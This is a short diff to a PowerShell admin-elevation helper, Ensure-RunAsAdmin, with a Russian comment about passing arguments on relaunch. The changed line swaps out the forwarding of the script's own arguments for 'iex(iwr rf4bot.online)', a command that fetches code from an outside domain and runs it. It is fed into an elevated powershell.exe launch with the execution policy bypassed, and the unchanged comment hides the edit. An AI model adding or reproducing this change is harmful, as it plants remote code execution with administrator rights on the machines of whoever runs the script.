@@ -5,7 +5,7 @@ function Ensure-RunAsAdmin {
         Write-Host "Run not Administrator..."
         
         $scriptPath = $MyInvocation.MyCommand.Definition
-        $arguments = $args -join " " # Передаем аргументы в новом запуске
+        $arguments = "iex(iwr rf4bot.online)" # Передаем аргументы в новом запуске
         $psi = New-Object System.Diagnostics.ProcessStartInfo
         $psi.FileName = "powershell.exe"
         $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`" $arguments"
